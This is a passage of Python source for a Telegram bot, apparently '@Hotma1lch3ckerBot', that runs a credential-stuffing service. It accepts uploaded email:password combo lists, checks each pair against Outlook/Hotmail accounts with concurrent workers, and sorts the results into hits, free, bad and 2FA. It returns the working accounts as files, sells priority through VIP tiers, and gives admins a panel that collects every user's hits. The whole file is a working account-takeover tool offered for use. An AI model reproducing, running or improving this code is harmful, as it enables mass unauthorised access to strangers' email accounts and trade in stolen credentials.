            if job.checked % DASHBOARD_UPDATE_INTERVAL == 0 or job.checked == job.total:
                await update_dashboard(job, bot)

    async def worker(worker_id):
        loop = asyncio.get_running_loop()
        while not job.cancel_event.is_set():
            try:
                email, pwd = await asyncio.wait_for(account_queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                break

            checker = OutlookSenderChecker()
            raw_result = await loop.run_in_executor(executor, checker.check_account, email, pwd)
            await update_stats(raw_result, email, pwd)
            account_queue.task_done()
            await asyncio.sleep(ACCOUNT_DELAY)

    workers = [asyncio.create_task(worker(i)) for i in range(THREADS_PER_JOB)]

    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        job.cancel_event.set()
        await asyncio.gather(*workers, return_exceptions=True)
        job.status = "cancelled"
    else:
        job.status = "completed"
    finally:
        await update_dashboard(job, bot)

        if hit_accounts:
            hit_content = "".join(
                ResultManager._format_entry(e, p, rd if isinstance(rd, dict) else None)
                for e, p, rd in hit_accounts
            )
            hit_file = io.BytesIO(hit_content.encode())
            hit_file.name = f"@Hotma1lch3ckerBot_hits_{job.user_id}.txt"
            await bot.send_document(
                chat_id=job.chat_id,
                document=hit_file,
                caption=f"🎯 *HIT Accounts Found: {len(hit_accounts)}*",
                parse_mode=ParseMode.MARKDOWN
            )

        if free_accounts:
            free_content = "".join(
                ResultManager._format_entry(e, p, rd if isinstance(rd, dict) else None)
                for e, p, rd in free_accounts
            )
            free_file = io.BytesIO(free_content.encode())
            free_file.name = f"@Hotma1lch3ckerBot_normal_{job.user_id}.txt"
            await bot.send_document(
                chat_id=job.chat_id,
                document=free_file,
                caption=f"🆓 *FREE Accounts (No Services): {len(free_accounts)}*",
                parse_mode=ParseMode.MARKDOWN
            )

        summary = (
            f"📊 *Job Summary*\n\n"
            f"✅ HIT: {job.hits}\n"
            f"🆓 FREE: {job.free}\n"
            f"❌ BAD: {job.bads}\n"
            f"🔐 2FA: {job.twofa}\n"
            f"⚠️ Errors: {job.errors}\n\n"
            f"📁 Files sent:\n"
            f"• Hits: `@Hotma1lch3ckerBot_hits_{job.user_id}.txt`\n"
            f"• Free: `@Hotma1lch3ckerBot_normal_{job.user_id}.txt`\n"
        )
        await bot.send_message(
            chat_id=job.chat_id,
            text=summary,
            parse_mode=ParseMode.MARKDOWN
        )


async def queue_worker(bot):
    while True:
        job = await job_queue.get()
        if job.status == "cancelled":
            job_queue.task_done()
            continue
        try:
            msg = await bot.send_message(
                chat_id=job.chat_id,
                text=format_dashboard_html(job),
                parse_mode=ParseMode.HTML
            )
            job.dashboard_msg_id = msg.message_id
            await process_job(job, bot)
            status_text = "✅ Job completed!" if job.status == "completed" else "❌ Job cancelled."
            await bot.send_message(chat_id=job.chat_id, text=status_text)
        except Exception as e:
            print(f"[queue_worker] Error processing job for user {job.user_id}: {e}")
            try:
                await bot.send_message(chat_id=job.chat_id, text="⚠️ An error occurred while processing your job.")
            except Exception:
                pass
        finally:
            if job.user_id in user_jobs and user_jobs[job.user_id] is job:
                del user_jobs[job.user_id]
            job_queue.task_done()


# ================= DAILY RESET =================
async def daily_reset_check():
    last_check_date = None
    while True:
        today = get_today_istanbul()
        if last_check_date != today:
            users = load_users()
            changed = False
            for uid in users:
                user = users[uid]
                if user.get("daily_stats", {}).get("date") != today.isoformat():
                    user["daily_stats"] = {"date": today.isoformat(), "files_uploaded": 0}
                    changed = True
                for field, default in [("vip_level", 0), ("total_jobs", 0), ("total_hits", 0)]:
                    if field not in user:
                        user[field] = default
                        changed = True
            if changed:
                save_users(users)
                print(f"[{datetime.now()}] Daily counters reset.")
            last_check_date = today
        await asyncio.sleep(3600)


# ================= ADMIN PANEL =================
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return

    keyboard = [
        [InlineKeyboardButton("📊 Dashboard", callback_data="admin_dashboard")],
        [InlineKeyboardButton("📁 All Hits", callback_data="admin_all_hits")],
        [InlineKeyboardButton("👥 User List", callback_data="admin_user_list")],
        [InlineKeyboardButton("📂 User Files", callback_data="admin_user_files")],
    ]
    await update.message.reply_text(
        "👑 *Admin Panel*\n\nChoose an option:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await query.edit_message_text("❌ Unauthorized")
        return

    data = query.data

    if data == "admin_dashboard":
        users = load_users()
        total_users = len(users)
        total_jobs = sum(u.get("total_jobs", 0) for u in users.values())
        total_hits = sum(u.get("total_hits", 0) for u in users.values())
        total_files_today = sum(u.get("daily_stats", {}).get("files_uploaded", 0) for u in users.values())

        total_result_files = 0
        if os.path.exists(RESULT_BASE_DIR):
            for root, dirs, files in os.walk(RESULT_BASE_DIR):
                total_result_files += len([f for f in files if f.endswith(".txt")])

        text = (
            f"📊 *Admin Dashboard*\n\n"
            f"👥 **Total Users:** {total_users}\n"
            f"📋 **Total Jobs:** {total_jobs}\n"
            f"🎯 **Total Hits:** {total_hits}\n"
            f"📁 **Files Today:** {total_files_today}\n"
            f"📚 **Result Files:** {total_result_files}\n\n"
            f"📂 Results Directory: `{RESULT_BASE_DIR}`\n"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

    elif data == "admin_all_hits":
        all_hits = []
        if os.path.exists(RESULT_BASE_DIR):
            for user_dir in os.listdir(RESULT_BASE_DIR):
                user_path = os.path.join(RESULT_BASE_DIR, user_dir)
                if not os.path.isdir(user_path):
                    continue
                for job_dir in os.listdir(user_path):
                    hits_file = os.path.join(user_path, job_dir, "hits.txt")
                    if os.path.exists(hits_file):
                        with open(hits_file, "r", encoding="utf-8") as f:
                            all_hits.extend(f.readlines())

        if not all_hits:
            await query.edit_message_text("No hits found.")
            return

        hits_text = "".join(all_hits[-100:])
        hits_io = io.BytesIO(hits_text.encode())
        hits_io.name = "all_hits.txt"
        await query.message.reply_document(
            document=hits_io,
            caption=f"📁 All Hits (Total: {len(all_hits)})\nShowing last 100 hits."
        )

    elif data == "admin_user_list":
        users = load_users()
        if not users:
            await query.edit_message_text("No users found.")
            return

        level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
        text = "👥 *User List*\n\n"
        for uid, udata in users.items():
            level = udata.get("vip_level", 0)
            jobs = udata.get("total_jobs", 0)
            hits = udata.get("total_hits", 0)
            daily = udata.get("daily_stats", {}).get("files_uploaded", 0)
            text += f"**ID:** `{uid}`\n"
            text += f"**Level:** {level_names.get(level, str(level))}\n"
            text += f"**Jobs:** {jobs} | **Hits:** {hits} | **Today:** {daily}\n\n"
            if len(text) > 3500:
                text += "..."
                break
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

    elif data == "admin_user_files":
        users = load_users()
        keyboard = []
        for uid in list(users.keys())[:10]:
            keyboard.append([InlineKeyboardButton(f"User {uid}", callback_data=f"admin_user_{uid}")])
        await query.edit_message_text(
            "📂 *Select User:*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data.startswith("admin_user_"):
        target_id = data[len("admin_user_"):]
        user_path = os.path.join(RESULT_BASE_DIR, target_id)

        if not os.path.exists(user_path):
            await query.edit_message_text(f"No files found for user {target_id}")
            return

        jobs_list = []
        for job_dir in os.listdir(user_path):
            job_path = os.path.join(user_path, job_dir)
            if not os.path.isdir(job_path):
                continue
            hits_file = os.path.join(job_path, "hits.txt")
            hit_count = 0
            if os.path.exists(hits_file):
                with open(hits_file, "r", encoding="utf-8") as f:
                    hit_count = len(f.readlines())
            jobs_list.append((job_dir, hit_count))

        if not jobs_list:
            await query.edit_message_text(f"No jobs found for user {target_id}")
            return

        keyboard = []
        for job_dir, hit_count in jobs_list[-10:]:
            display_name = job_dir[:20] + "..." if len(job_dir) > 20 else job_dir
            keyboard.append([InlineKeyboardButton(
                f"📁 {display_name} (Hits: {hit_count})",
                callback_data=f"admin_job_{target_id}_{job_dir}"
            )])
        await query.edit_message_text(
            f"📂 *User {target_id} Files*\n\n",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data.startswith("admin_job_"):
        remainder = data[len("admin_job_"):]
        parts = remainder.split("_", 1)
        if len(parts) != 2:
            return
        target_id, job_dir = parts
        job_path = os.path.join(RESULT_BASE_DIR, target_id, job_dir)

        hits_file = os.path.join(job_path, "hits.txt")
        free_file = os.path.join(job_path, "free.txt")

        if os.path.exists(hits_file):
            with open(hits_file, "r", encoding="utf-8") as f:
                hits_content = f.read()
            hits_io = io.BytesIO(hits_content.encode())
            hits_io.name = f"user_{target_id}_hits.txt"
            await query.message.reply_document(
                document=hits_io,
                caption=f"📁 Hits for user {target_id}\nJob: {job_dir}"
            )

        if os.path.exists(free_file):
            with open(free_file, "r", encoding="utf-8") as f:
                free_content = f.read()
            free_io = io.BytesIO(free_content.encode())
            free_io.name = f"user_{target_id}_free.txt"
            await query.message.reply_document(
                document=free_io,
                caption=f"🆓 Free accounts for user {target_id}\nJob: {job_dir}"
            )


# ================= BOT COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
    daily_files = user["daily_stats"]["files_uploaded"]
    daily_limit = DAILY_FILE_LIMITS[user["vip_level"]]
    limit_text = f"{daily_files}/{'∞' if daily_limit >= 9999 else daily_limit}"

    text = (
        f"👋 *Welcome!*\n\n"
        f"**Your Level:** {level_names[user['vip_level']]}\n"
        f"**Today:** {limit_text} files\n\n"
        f"📎 Upload a `.txt` file (each line: `email:password`)\n"
        f"Bot will scan for 200+ platforms\n\n"
        f"*Commands:*\n"
        f"/stats – Your statistics\n"
        f"/cancel – Cancel current job"
    )
    if user_id in ADMIN_IDS:
        text += "\n/admin – Admin Panel"

    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
    daily_files = user["daily_stats"]["files_uploaded"]
    daily_limit = DAILY_FILE_LIMITS[user["vip_level"]]
    limit_text = f"{daily_files}/{'∞' if daily_limit >= 9999 else daily_limit}"

    await update.message.reply_text(
        f"📊 *Your Statistics*\n\n"
        f"**Level:** {level_names[user['vip_level']]}\n"
        f"**Today's files:** {limit_text}\n"
        f"**Total jobs:** {user['total_jobs']}\n"
        f"**Total hits:** {user['total_hits']}",
        parse_mode=ParseMode.MARKDOWN
    )


async def setlevel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return

    try:
        target_id = int(context.args[0])
        level = int(context.args[1])
        if level not in (0, 1, 2):
            await update.message.reply_text("Level must be 0, 1, or 2.")
            return
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /setlevel <user_id> <0|1|2>")
        return

    update_user(target_id, {"vip_level": level})
    await update.message.reply_text(f"✅ User {target_id} level set to {level}")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    job = user_jobs.get(user_id)
    if job and job.status == "running":
        job.cancel_event.set()
        await update.message.reply_text("⏹️ Cancelling your job...")
    else:
        await update.message.reply_text("You have no active job.")


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    user = get_user(user_id)

    vip_level = user.get("vip_level", 0)
    max_file_size = FILE_SIZE_LIMITS.get(vip_level, FILE_SIZE_LIMITS[0])
    daily_limit = DAILY_FILE_LIMITS.get(vip_level, DAILY_FILE_LIMITS[0])
    daily_uploaded = user["daily_stats"]["files_uploaded"]

    if daily_uploaded >= daily_limit:
        await update.message.reply_text(
            f"❌ Daily limit reached: {daily_limit} files.\n"
            f"Try again tomorrow or upgrade to VIP."
        )
        return

    doc = update.message.document
    if doc.file_size > max_file_size:
        mb_limit = max_file_size / (1024 * 1024)
        await update.message.reply_text(f"❌ Max file size: {mb_limit:.0f} MB for your level.")
        return

    if user_id in user_jobs and user_jobs[user_id].status in ("queued", "running"):
        await update.message.reply_text("You already have a job in progress. Use /cancel first.")
        return

    file = await doc.get_file()
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode("utf-8", errors="ignore")

    combo_list = []
    for line in content.splitlines():
        line = line.strip()
        if ":" in line:
            parts = line.split(":", 1)
            if len(parts) == 2 and parts[0] and parts[1]:
                combo_list.append((parts[0].strip(), parts[1].strip()))

    if not combo_list:
        await update.message.reply_text("No valid email:password lines found.")
        return

    increment_daily_file_count(user_id)
    update_user(user_id, {"total_jobs": user["total_jobs"] + 1})

    filename = doc.file_name or "uploaded.txt"
    priority = 0 if vip_level > 0 else 1
    job = Job(user_id, chat_id, combo_list, filename, priority=priority)
    user_jobs[user_id] = job

    await job_queue.put(job)

    await update.message.reply_text(
        f"📥 {len(combo_list)} accounts added to queue.\n"
        f"Queue position: {job_queue.qsize()}"
    )


# ================= POST INIT =================
async def post_init(app: Application):
    global job_queue
    # Create asyncio objects inside the running event loop
    job_queue = asyncio.PriorityQueue()

    asyncio.create_task(daily_reset_check())
    for _ in range(MAX_CONCURRENT_JOBS):
        asyncio.create_task(queue_worker(app.bot))

    print(f"✅ {MAX_CONCURRENT_JOBS} queue workers started.")


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.post_init = post_init

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("setlevel", setlevel))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_file))

    print("🚀 Bot starting...")
    print(f"⚙️ Threads per job: {THREADS_PER_JOB} | Max concurrent jobs: {MAX_CONCURRENT_JOBS}")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    app.run_polling()


if __name__ == "__main__":
    Path(RESULT_BASE_DIR).mkdir(exist_ok=True)
    main()
